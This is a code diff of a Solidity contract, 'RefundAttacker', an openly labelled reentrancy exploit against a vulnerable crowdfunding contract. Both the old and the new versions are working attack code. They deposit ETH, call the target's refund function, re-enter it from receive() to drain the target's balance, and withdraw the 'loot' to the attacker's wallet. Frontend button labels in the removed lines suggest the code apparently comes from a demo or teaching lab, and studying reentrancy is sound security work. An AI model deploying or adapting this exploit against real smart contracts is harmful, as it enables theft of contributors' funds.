@@ -1,112 +1,61 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.20;
 
+// Interface for the vulnerable crowdfund contract
 interface ICrowdfundVulnerable {
     function contribute() external payable;
-    function refund() external;
-    function getBalance() external view returns (uint256);
-    function goal() external view returns (uint256);
-    function totalRaised() external view returns (uint256);
+    function requestRefund() external;
 }
 
 contract RefundAttacker {
-    ICrowdfundVulnerable public crowdfund;
-    address public attacker;
+    // EOA that controls this attacker contract
+    address payable public attacker;
 
-    uint256 public lastContribution;  // last contribution size
-    uint256 public attackAmount;      // amount used per refund re-entry
+    // Target vulnerable crowdfund contract
+    ICrowdfundVulnerable public vulnerable;
 
     modifier onlyAttacker() {
         require(msg.sender == attacker, "Not attacker");
         _;
     }
 
-    event AttackTriggered(uint256 attackAmount, uint256 crowdfundBalance);
-    event ContributionForwarded(uint256 amount);
-    event LootWithdrawn(uint256 amount);
-
-    constructor(address _crowdfund) {
-        crowdfund = ICrowdfundVulnerable(_crowdfund);
-        attacker  = msg.sender;
+    constructor(address _vulnerable) {
+        attacker = payable(msg.sender);
+        vulnerable = ICrowdfundVulnerable(_vulnerable);
     }
 
-    /**
-     * STEP 1 – Attacker contributes via this contract
-     * UI button: "Contribute / Deposit"
-     *
-     * Attacker wallet sends ETH to this function.
-     * The contract forwards it to crowdfund.contribute()
-     * and records attackAmount = msg.value for reentrancy.
-     */
-    function depositToCrowdfund() external payable onlyAttacker {
-        require(msg.value > 0, "No ETH sent");
-
-        lastContribution = msg.value;
-        attackAmount     = msg.value; // used in receive() re-entrancy
-
-        // forward contribution to vulnerable crowdfund
-        crowdfund.contribute{value: msg.value}();
-
-        emit ContributionForwarded(msg.value);
+    // STEP 1: Attacker funds attacker contract (EOA -> this contract)
+    function fundAttacker() external payable onlyAttacker {
+        // ETH stays in this contract
     }
 
-    /**
-     * STEP 2 – Trigger the reentrancy via refund()
-     * UI button: "Run Attack"
-     *
-     * We do NOT send value here. We just call refund(),
-     * which will send ETH back to this contract and hit receive().
-     */
+    // STEP 2: Contribute contract balance into the crowdfund
+    function contributeFromContract(uint256 amount) external onlyAttacker {
+        require(
+            address(this).balance >= amount,
+            "Insufficient attacker contract balance"
+        );
+
+        // send 'amount' from this contract into the vulnerable crowdfund
+        vulnerable.contribute{value: amount}();
+    }
+
+    // STEP 3: Trigger reentrancy (no ETH sent here)
     function runAttack() external onlyAttacker {
-        // No value is sent; we simply trigger the vulnerable refund logic.
-        crowdfund.refund();
-
-        emit AttackTriggered(attackAmount, address(crowdfund).balance);
+        vulnerable.requestRefund();
     }
 
-    /**
-     * STEP 3 – Withdraw the stolen ETH to attacker EOA
-     * UI button: "Withdraw Loot"
-     */
-    function withdrawLoot() external onlyAttacker {
-        uint256 bal = address(this).balance;
-        require(bal > 0, "No loot");
-
-        (bool ok, ) = attacker.call{value: bal}("");
-        require(ok, "Withdraw failed");
-
-        emit LootWithdrawn(bal);
-    }
-
-    /**
-     * Reentrancy hook: each time crowdfund sends us ETH in refund(),
-     * this receive() is called. While the crowdfund still has at
-     * least attackAmount ETH, we ask for another refund.
-     */
+    // STEP 4: Reentrancy loop – called when vulnerable sends ETH back
     receive() external payable {
-        uint256 crowdfundBalance = address(crowdfund).balance;
-
-        if (crowdfundBalance >= attackAmount && attackAmount > 0) {
-            crowdfund.refund();
-        } else {
-            // stop condition – prevent infinite loop if drained
-            attackAmount = 0;
+        if (address(vulnerable).balance > 0) {
+            vulnerable.requestRefund();
         }
     }
 
-    // ===== View helpers for the frontend =====
-
-    function getCrowdfundInfo()
-        external
-        view
-        returns (uint256 _goal, uint256 _totalRaised, uint256 _balance)
-    {
-        _goal        = crowdfund.goal();
-        _totalRaised = crowdfund.totalRaised();
-        _balance     = crowdfund.getBalance();
-    }
-
-    function getAttackerContractBalance() external view returns (uint256) {
-        return address(this).balance;
+    // STEP 5: Withdraw stolen ETH from attacker contract to attacker EOA
+    function withdrawLoot() external onlyAttacker {
+        uint256 bal = address(this).balance;
+        require(bal > 0, "No loot");
+        attacker.transfer(bal);
     }
 }
